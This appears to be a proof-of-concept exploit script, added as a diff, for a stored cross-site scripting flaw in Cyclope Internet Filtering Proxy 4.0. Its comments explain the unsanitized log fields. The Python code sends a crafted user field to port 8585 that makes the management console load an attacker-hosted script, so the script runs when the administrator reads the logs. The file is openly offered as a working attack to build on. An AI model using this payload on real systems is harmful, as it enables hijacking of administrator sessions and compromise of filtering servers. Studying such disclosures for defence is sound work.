@@ -1,0 +1,45 @@
+#!/usr/bin/python
+
+# Title: Cyclope Internet Filtering Proxy 4.0 - Stored XSS Vuln.
+# From: The eh?-Team || The Great White Fuzz (we're not sure yet)
+# Found by: loneferret
+# Software link: http://www.cyclope-series.com/download/index.aspx?p=2
+ 
+# Date Found: Oct 20th 2011
+# Tested on: Windows XP SP3 Professional / Windows Server 2008 R2 Standard
+# Tested with: Registered and Unregistered versions
+# Nod to the Exploit-DB Team
+  
+# The Cyclope Internet Filtering Proxy is your basic white & black list website navigation filtering app.
+# It will log all of the client's activities such as visited web sites, the time etc.
+# There's an optional client application if the administrator wishes to acquire the computer name and user
+# information.
+
+# This XSS vulnerability is due to the fact that nothing is sanitized in the web-based management console.
+# The whitelist and blacklist patterns, for example, are vulnerable. As well as computer name and user fields 
+# gathered via the logging port.
+# This PoC takes advantage of the "user" field (but also works with computer feild). One needs to send in the correct order:
+# <user>USER</user><computer>COMPUTER</computer><ip>IP ADDY</ip>\n to the default log port 8585.
+# None of these fileds are sanitized. So it's making this XSS a bit more interesing. 
+# Atacking machine doesn't need the Cyclope client app installed.
+# Limited in what can be sent, a space will screw up any code you send. The HTML code &nbsp; will usually fix that problem,
+# as well as all the other HTML codes for quotes and so on.
+# So we can remotely inserted our evil XSS, and have it executed when the administrator looks over the logs.
+
+# As always, if anyone wants to take this PoC to the next level, be my guest.
+# Have fun,
+# loneferret
+
+import struct
+import socket
+
+# Remember to enter a webserver with a js file
+buffer = "<user><SCRIPT/SRC=http://xxx.xxx.xxx.xxx/xss.js></SCRIPT></user><computer>Windows</computer><ip>2.2.2.2</ip>\n"
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+print "\nSending evil buffer..."
+s.connect(('xxx.xxx.xxx.xxx',8585)) #Enter Cyclope server IP address
+s.send(buffer)
+s.close()
+print "\nDone! "
+
